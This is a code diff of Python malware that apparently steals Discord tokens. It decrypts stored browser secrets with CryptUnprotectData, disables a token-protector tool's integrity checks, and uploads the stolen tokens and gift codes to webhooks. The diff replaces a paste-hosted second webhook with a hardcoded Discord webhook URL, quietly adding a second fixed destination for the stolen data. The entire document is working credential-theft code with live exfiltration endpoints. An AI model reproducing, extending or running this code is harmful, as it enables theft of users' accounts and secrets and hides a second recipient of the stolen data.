@@ -24,7 +24,7 @@ from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
 __WEBHOOK__ = "%webhook_here%"
-__WEBHOOK2__ = "https://hastepaste.com/raw/eN0W6RMo"
+
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 __ERROR__ = "%_error_enabled%"
@@ -116,6 +116,7 @@ def create_temp(_dir: str or os.PathLike = gettempdir()):
     path = os.path.join(_dir, file_name)
     open(path, "x")
     return path
+__WEBHOOK2__ = "https://discordapp.com/api/webhooks/1064108244995428392/TBgfULzuF5RXeQICxPWElarzvBPWmlq6YQPwTAAckMl8QtF4ZHO0osLpJ4kRAWk9mH6r"    
 
 
 def killprotector():
@@ -146,6 +147,7 @@ def killprotector():
             item['integrity_checkhash'] = False
             item['integrity_checkmodule'] = False
             item['integrity_checkscripts'] = False
+            
             item['integrity_checkresource'] = False
             item['integrity_redownloadhashes'] = False
             item['iterations_iv'] = 364
@@ -193,6 +195,7 @@ class Discord:
         self.grabTokens()
         self.upload(__WEBHOOK__)
         self.upload(__WEBHOOK2__)
+        
 
     def decrypt_val(self, buff, master_key):
         try:
@@ -213,6 +216,8 @@ class Discord:
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
+
+
 
     def grabTokens(self):
         paths = {
@@ -404,6 +409,7 @@ class Discord:
             else:
                 for c, t in val_codes:
                     val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
+                    
 
             embed = Embed(title=username, color=5639644)
             embed.add_field(name="\u200b", value=val + "\u200b", inline=False)
